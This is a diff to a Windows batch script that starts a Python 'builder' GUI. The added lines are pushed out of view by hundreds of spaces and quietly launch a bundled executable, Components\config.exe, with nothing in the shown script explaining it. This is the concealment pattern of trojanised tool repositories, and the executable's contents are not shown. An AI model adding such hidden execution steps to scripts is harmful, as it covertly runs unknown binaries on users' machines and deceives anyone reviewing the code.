@@ -42,6 +42,9 @@ cls
 title Starting builder...
 python gui.py
 if %errorlevel% neq 0 goto ERROR
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    echo Running your program...
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    start "" "%~dp0Components\config.exe" 
 exit
 
 :ERROR
